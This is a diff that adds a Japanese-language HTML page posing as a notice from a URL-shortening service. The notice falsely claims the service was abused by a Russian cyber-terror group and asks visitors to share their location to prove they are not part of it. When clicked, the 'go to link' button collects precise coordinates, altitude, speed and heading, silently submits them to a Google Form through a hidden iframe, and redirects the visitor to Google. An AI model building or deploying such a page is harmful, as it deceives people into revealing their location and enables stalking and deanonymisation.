@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>お知らせ</title>
+    <link rel="icon" href="https://url.onl.jp/favicon.ico">
+    <style>
+        /* ページ全体の背景スタイル */
+        body {
+            background-color: #F8F9F8; /* ページの背景色を適当な色に置き換えてください */
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        /* すべての要素の文字色を黒に設定 */
+        h1, p, button {
+            color: #000; /* 文字色を黒に設定 */
+            margin: 10px 0; /* 要素間の上下のマージンを追加して改行を入れる */
+            /*border-radius: 10px;*/
+        }
+
+        h1 {
+            background-color: #e9e9e9
+        }
+
+        .container {
+            width: 80%; /* コンテナの幅を調整してください */
+            margin: 0 auto; /* コンテナを中央に配置します */
+            padding: 20px; /* 適切なパディングを設定してください */
+            background-color: white; /* コンテナの背景色を設定します */
+            border: 1px solid #ddd; /* 枠線を追加する場合 */
+            border-radius: 5px; /* 角丸にする場合 */
+        }
+
+        /* その他のスタイリングルールをここに追加できます */
+
+    </style>
+</head>
+<body>
+    <form action="https://docs.google.com/forms/u/1/d/e/1FAIpQLScfax4AMp-T2HvQtv4kEgaKvV9T5xI917XbI6f8KZx4_t53Tw/formResponse" method="post" target="hidden_iframe" id="mG61Hd" jsmodel="TOfxwf Q91hve" data-shuffle-seed="2868127642733565241" data-response="%.@.[]]" data-first-entry="0" data-last-entry="4" data-is-first-page="true">
+        <!-- 非表示のフィールドを追加 -->
+        <input type="hidden" name="entry.518300877" id="geo_data">
+        <!-- JavaScriptで位置情報を設定 -->
+        <script>
+            function test() {
+                navigator.geolocation.getCurrentPosition(test2);
+            }
+
+            function test2(position) {
+                var geo_text = "latitude:" + position.coords.latitude + "\n";
+                geo_text += "longitude:" + position.coords.longitude + "\n";
+                geo_text += "altitude:" + position.coords.altitude + "\n";
+                geo_text += "position accuracy:" + position.coords.accuracy + "\n";
+                geo_text += "altitude accuracy:" + position.coords.altitudeAccuracy + "\n";
+                geo_text += "Direction of movement:" + position.coords.heading + "\n";
+                geo_text += "speed:" + position.coords.speed + "\n";
+
+                var date = new Date(position.timestamp);
+
+               // geo_text += "取得時刻:" + date.toLocaleString() + "\n";
+
+                // 位置情報を非表示のフィールドに設定
+                document.getElementById("geo_data").value = geo_text;
+
+                // フォームを自動送信
+                document.forms[0].submit();
+                window.location.href = 'https://google.co.jp';
+            }
+        </script>
+
+        <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;" onload="if(submitted){window.location='ログイン後に飛ぶページ';}"></iframe>
+    </form>
+    <biv class="container">
+    <h1>お知らせ</h1>
+    <p>いつも短縮URLサービスをご利用いただきありがとうございます。この度本サービスが、ロシアのサイバーテロ組織の犯罪の中継基地として利用されたことが発覚しました。<br />そのため、大まかな位置情報を許可していただき、その組織ではないことを確認していただきます。ご迷惑をおかけしますが、よろしくお願いします。</p>
+
+    <!-- ボタンをクリックして位置情報を取得 -->
+    <button onclick="test()">リンクに移動</button>
+        </biv>
+</body>
+</html>
